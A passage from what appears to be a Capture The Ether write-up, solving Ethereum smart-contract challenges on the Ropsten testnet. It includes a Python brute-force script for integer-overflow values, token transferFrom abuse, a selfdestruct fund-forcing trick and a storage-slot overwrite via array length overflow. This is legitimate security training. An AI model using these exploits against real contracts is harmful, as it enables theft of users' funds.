+<p>All that’s needed to be passed to <code>numTokens</code> is a value that when multiplied by <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.814108em; vertical-align: 0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></span> will yield a number that we can:</p>
+<ol>
+<li>Pay for in wei that is lower than  <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.814108em; vertical-align: 0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span></span> itself</li>
+<li>As low as possible (ideally) as long as condition 1 holds</li>
+</ol>
+<p>For this you can create a simple function that will be the base to the overflow exploit, for example:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">⌊</mo><mo stretchy="false">(</mo><mfrac><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>∗</mo><mi>x</mi></mrow><mrow><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup><mo stretchy="false">⌋</mo><mspace></mspace><mspace width="1em"></mspace><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow>  <msup><mn>2</mn><mn>256</mn></msup></mrow><annotation encoding="application/x-tex">f(x) = \lfloor (\frac{2^{256} * x}{10^{18}} + 1) * 10^{18}\rfloor\mod 2^{256}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 2.17711em; vertical-align: -0.686em;"></span><span class="mopen">⌊(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.49111em;"><span class="" style="top: -2.314em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.740108em;"><span class="" style="top: -2.989em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.677em;"><span class="pstrut" style="height: 3em;"></span><span class="mord"><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mord mathnormal">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.686em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1.11411em; vertical-align: -0.25em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em;"><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span><span class="mclose">⌋</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right: 1em;"></span></span><span class="base"><span class="strut" style="height: 0.864108em; vertical-align: 0em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mspace" style="margin-right: 0.166667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em;"><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p>Then optimize for <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">min(f(x))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">min</span><span class="mopen">(</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">))</span></span></span></span></span> while <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x &gt; 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.5782em; vertical-align: -0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0</span></span></span></span></span>. I did this by bruteforce and made a simple neat table with the best numbers I got:</p>
+
+<table>
+<thead>
+<tr>
+<th>f(x)</th>
+<th>x</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>265665118208</td>
+<td>549972</td>
+</tr>
+<tr>
+<td>531330236416</td>
+<td>1099944</td>
+</tr>
+<tr>
+<td>730579075072</td>
+<td>1512423</td>
+</tr>
+<tr>
+<td>996244193280</td>
+<td>2062395</td>
+</tr>
+<tr>
+<td>1261909311488</td>
+<td>2612367</td>
+</tr>
+</tbody>
+</table><p>I used this simple script to do it and then neatly pack it on one dataframe:</p>
+<pre class=" language-python"><code class="prism  language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> floor
+<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
+<span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd
+
+<span class="token comment"># make list to optimize</span>
+best_vals <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'ideal_overflow'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'ideal_overflow_multiplier'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'loop_range'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">}</span>
+
+<span class="token comment"># minimizing for the remainder gas to send</span>
+overflow_computation <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token punctuation">(</span>floor<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token operator">*</span>x<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+np_overflow_computation <span class="token operator">=</span> np<span class="token punctuation">.</span>vectorize<span class="token punctuation">(</span>overflow_computation<span class="token punctuation">)</span>
+
+<span class="token comment"># loop a bunch of times</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    range_to_test <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">5e5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">5e5</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    tested_range <span class="token operator">=</span> np_overflow_computation<span class="token punctuation">(</span>range_to_test<span class="token punctuation">)</span>
+    ideal_overflow <span class="token operator">=</span> np<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span>tested_range<span class="token punctuation">)</span>
+    ideal_overflow_multiplier <span class="token operator">=</span> np<span class="token punctuation">.</span>where<span class="token punctuation">(</span>tested_range <span class="token operator">==</span> ideal_overflow<span class="token punctuation">)</span>
+
+    <span class="token comment"># construct csv</span>
+    best_vals<span class="token punctuation">[</span><span class="token string">'ideal_overflow'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>ideal_overflow<span class="token punctuation">)</span>
+    best_vals<span class="token punctuation">[</span><span class="token string">'ideal_overflow_multiplier'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>range_to_test<span class="token punctuation">[</span>ideal_overflow_multiplier<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    best_vals<span class="token punctuation">[</span><span class="token string">'loop_range'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>np<span class="token punctuation">.</span><span class="token builtin">min</span><span class="token punctuation">(</span>range_to_test<span class="token punctuation">)</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span><span class="token builtin">max</span><span class="token punctuation">(</span>range_to_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    
+best_vals <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>best_vals<span class="token punctuation">)</span>
+best_vals<span class="token punctuation">.</span>to_csv<span class="token punctuation">(</span><span class="token string">'best_vals.csv'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>best_vals<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span>by<span class="token operator">=</span><span class="token string">'ideal_overflow'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p>In this case, I’d simply choose the lowest one for <code>f(x)</code> and make the function calls:</p>
+<ol>
+<li>
+<p>Call <code>buy()</code> passing in <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mfrac><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>∗</mo><mn>549972</mn></mrow><mrow><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(\frac{2^{256} * 549972}{10^{18}} + 1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1.36292em; vertical-align: -0.345em;"></span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.01792em;"><span class="" style="top: -2.655em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.746314em;"><span class="" style="top: -2.786em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">18</span></span></span></span></span></span></span></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.891314em;"><span class="" style="top: -2.931em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mbin mtight">∗</span><span class="mord mtight">549972</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> as <code>numTokens</code>.</p>
+</li>
+<li>
+<p>Call <code>sell()</code> passing in <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">1</span></span></span></span></span> as <code>numTokens</code>.</p>
+</li>
+<li>
+<p>Check if the challenge is complete by calling <code>isComplete()</code> or just clicking on <em>Check Solution</em> on the Capture The Ether site.</p>
+</li>
+</ol>
+<h4 id="alternative-better-solution">Alternative (better) solution</h4>
+<p>I asked a question on the Ethereum StackExchange regarding some of my lack of understanding of solidity mathematical operations and Usmann was kind enough to write a better solution than mine which allows you to solve this while being able to send 0 wei to the contract. His solution was layed out in his answer to my question <a href="https://ethereum.stackexchange.com/a/131705/104415">here</a>.</p>
+<h4 id="submission-transaction-8">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x8b95f854e11e1b9a50f38f689d44bc018f65abc19753af497838b1ad5987b6ca">https://ropsten.etherscan.io/tx/0x8b95f854e11e1b9a50f38f689d44bc018f65abc19753af497838b1ad5987b6ca</a></p>
+<hr>
+<h3 id="token-whale">Token whale</h3>
+<h4 id="objectives-9">Objectives</h4>
+<blockquote>
+<p>This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.<br>
+Find a way to accumulate at least 1,000,000 tokens to solve this challenge.</p>
+</blockquote>
+<h4 id="solution-9">Solution</h4>
+<p>The <code>transferFrom()</code> function in this contract is using the same <code>_transfer()</code> internal function as <code>transfer()</code>, however, <code>transferFrom()</code> should be deducting tokens from the address whose tokens are being moved out, so the address we pass as <code>from</code> in <code>transferFrom()</code>, however, it instead deducts it from <code>msg.sender</code>.</p>
+<p>Because of this bug and the fact that the contract is using Solidity 0.4.21, this opens the contract up for an integer overflow bug. All we have to do to exploit it is to:</p>
+<ol>
+<li>
+<p>Call <code>approve()</code> from address 1 to approve address 2 to move tokens out of address 1</p>
+</li>
+<li>
+<p>Call <code>transferFrom()</code> from address 2 and make sure that the receiving address is either address 1 or another address that is not address 2</p>
+</li>
+<li>
+<p>Call <code>transfer()</code> from address 2 to send at least 1M tokens to address 1</p>
+</li>
+<li>
+<p>Call <code>isComplete()</code> to check</p>
+</li>
+</ol>
+<h4 id="submission-transaction-9">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x038d72cb3b179c25582068f2d8a2ac3d701eabcf997ce918a424525ccf21bef5">https://ropsten.etherscan.io/tx/0x038d72cb3b179c25582068f2d8a2ac3d701eabcf997ce918a424525ccf21bef5</a></p>
+<hr>
+<h3 id="retirement-fund">Retirement fund</h3>
+<h4 id="objectives-10">Objectives</h4>
+<blockquote>
+<p>This retirement fund is what economists call a commitment device. I’m trying to make sure I hold on to 1 ether for retirement.<br>
+I’ve committed 1 ether to the contract below, and I won’t withdraw it until 10 years have passed. If I do withdraw early, 10% of my ether goes to the beneficiary (you!).<br>
+I really don’t want you to have 0.1 of my ether, so I’m resolved to leave those funds alone until 10 years from now. Good luck!</p>
+</blockquote>
+<h4 id="solution-10">Solution</h4>
+<p>The function <code>collectPenalty()</code> allows us to withdraw the entire balance of the contract if:</p>
+<ol>
+<li><code>startBalance</code> is more than the total contract balance</li>
+<li>If there’s an overflow where the balance of the contract is larger than <code>startBalance</code></li>
+</ol>
+<p>In this case, we simply cannot call <code>withdraw()</code> or somehow move funds away from the contract in any other way aside from option number 2. Therefore, because the contract has no payable function, we have to somehow force funds into the contract.</p>
+<p>An easy way to do this is to deploy another contract, fund it with at least 1 wei and then destroy it calling <code>selfdestruct()</code> in any of the contract functions and directing the contract funds into the retirement fund contract. This will allow us to cause an overflow that causes <code>withdrawn</code> to be larger than 0 and therefore drains the contract.</p>
+<p>The buggy line in question:</p>
+<pre class=" language-js"><code class="prism  language-js">uint256 withdrawn <span class="token operator">=</span> startBalance <span class="token operator">-</span> <span class="token function">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">;</span>
+</code></pre>
+<p>Nothing critical that allows drainage of funds should rely on the value of the contract balance. At least not on the upside, since anyone can simply force funds into the contract.</p>
+<h4 id="submission-transaction-10">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x2e1da049d1bc5a70bccc081c4734c9ebd3f8ada241252ffdbd261fc230918f86">https://ropsten.etherscan.io/tx/0x2e1da049d1bc5a70bccc081c4734c9ebd3f8ada241252ffdbd261fc230918f86</a></p>
+<hr>
+<h3 id="mapping">Mapping</h3>
+<h4 id="objectives-11">Objectives</h4>
+<blockquote>
+<p>Who needs mappings? I’ve created a contract that can store key/value pairs using just an array.</p>
+</blockquote>
+<h4 id="solution-11">Solution</h4>
+<p>Through the <code>set()</code> function, it’s possible to overflow the length of the array by passing in the maximum allowable uint256 minus 2 (as <code>key</code>).</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token keyword">set</span><span class="token punctuation">(</span>uint256 key<span class="token punctuation">,</span> uint256 value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>
+    <span class="token comment">// Expand dynamic array as needed</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>length <span class="token operator">&lt;=</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        map<span class="token punctuation">.</span>length <span class="token operator">=</span> key <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    map<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>After passing this value as <code>key</code>, the length of the array will be the maximum allowable uint256, which allows us to manipulate every single element in this contract’s storage, including <code>isComplete</code>.</p>
+<p>Given that <code>isComplete</code> is in the first contract storage slot, we can find the hash of this item as if it was part of the <code>map[]</code> array. That position will simply be the keccak256 hash of a uint256 that is <code>1</code>, in this case:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0</mn><mi>x</mi><mi>b</mi><mn>10</mn><mi>e</mi><mn>2</mn><mi>d</mi><mn>527612073</mn><mi>b</mi><mn>26</mn><mi>e</mi><mi>e</mi><mi>c</mi><mi>d</mi><mi>f</mi><mi>d</mi><mn>717</mn><mi>e</mi><mn>6</mn><mi>a</mi><mn>320</mn><mi>c</mi><mi>f</mi><mn>44</mn><mi>b</mi><mn>4</mn><mi>a</mi><mi>f</mi><mi>a</mi><mi>c</mi><mn>2</mn><mi>b</mi><mn>0732</mn><mi>d</mi><mn>9</mn><mi>f</mi><mi>c</mi><mi>b</mi><mi>e</mi><mn>2</mn><mi>b</mi><mn>7</mn><mi>f</mi><mi>a</mi><mn>0</mn><mi>c</mi><mi>f</mi><mn>6</mn></mrow><annotation encoding="application/x-tex">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.88888em; vertical-align: -0.19444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal">b</span><span class="mord">10</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">d</span><span class="mord">527612073</span><span class="mord mathnormal">b</span><span class="mord">26</span><span class="mord mathnormal">eec</span><span class="mord mathnormal">dfd</span><span class="mord">717</span><span class="mord mathnormal">e</span><span class="mord">6</span><span class="mord mathnormal">a</span><span class="mord">320</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">44</span><span class="mord mathnormal">b</span><span class="mord">4</span><span class="mord mathnormal">a</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">0732</span><span class="mord mathnormal">d</span><span class="mord">9</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">c</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">7</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord">0</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">6</span></span></span></span></span></span></p>
+<p>We then subtract the value of this hash from the size of slots in memory that a contract can have, which is the maximum uint256 + 1, so <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup></mrow><annotation encoding="application/x-tex">2^{256}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.814108em; vertical-align: 0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span></span></span></span></span>, therefore:</p>
+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><mi>i</mi><mi>n</mi><mi>t</mi><mo stretchy="false">(</mo><mn>0</mn><mi>x</mi><mi>b</mi><mn>10</mn><mi>e</mi><mn>2</mn><mi>d</mi><mn>527612073</mn><mi>b</mi><mn>26</mn><mi>e</mi><mi>e</mi><mi>c</mi><mi>d</mi><mi>f</mi><mi>d</mi><mn>717</mn><mi>e</mi><mn>6</mn><mi>a</mi><mn>320</mn><mi>c</mi><mi>f</mi><mn>44</mn><mi>b</mi><mn>4</mn><mi>a</mi><mi>f</mi><mi>a</mi><mi>c</mi><mn>2</mn><mi>b</mi><mn>0732</mn><mi>d</mi><mn>9</mn><mi>f</mi><mi>c</mi><mi>b</mi><mi>e</mi><mn>2</mn><mi>b</mi><mn>7</mn><mi>f</mi><mi>a</mi><mn>0</mn><mi>c</mi><mi>f</mi><mn>6</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2^{256} - int(0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.947438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em;"><span class="" style="top: -3.113em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 1em; vertical-align: -0.25em;"></span><span class="mord mathnormal">in</span><span class="mord mathnormal">t</span><span class="mopen">(</span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord mathnormal">b</span><span class="mord">10</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">d</span><span class="mord">527612073</span><span class="mord mathnormal">b</span><span class="mord">26</span><span class="mord mathnormal">eec</span><span class="mord mathnormal">dfd</span><span class="mord">717</span><span class="mord mathnormal">e</span><span class="mord">6</span><span class="mord mathnormal">a</span><span class="mord">320</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">44</span><span class="mord mathnormal">b</span><span class="mord">4</span><span class="mord mathnormal">a</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">0732</span><span class="mord mathnormal">d</span><span class="mord">9</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">c</span><span class="mord mathnormal">b</span><span class="mord mathnormal">e</span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord">7</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord mathnormal">a</span><span class="mord">0</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">6</span><span class="mclose">)</span></span></span></span></span></span></p>
+<p>The hex value of this number is:</p>
